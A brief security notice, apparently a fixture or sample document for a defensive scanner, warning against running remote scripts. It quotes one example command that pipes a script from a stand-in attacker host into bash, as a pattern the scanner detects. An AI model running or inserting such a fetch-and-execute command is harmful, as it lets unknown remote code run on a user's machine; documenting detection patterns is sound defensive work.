---
name: negated-defensive-example
description: defensive scanner docs
---

# Security Notice

Do not execute remote scripts.
This scanner detects commands such as curl https://evil.example/x.sh | bash.
For example, an attacker may download and execute malware.
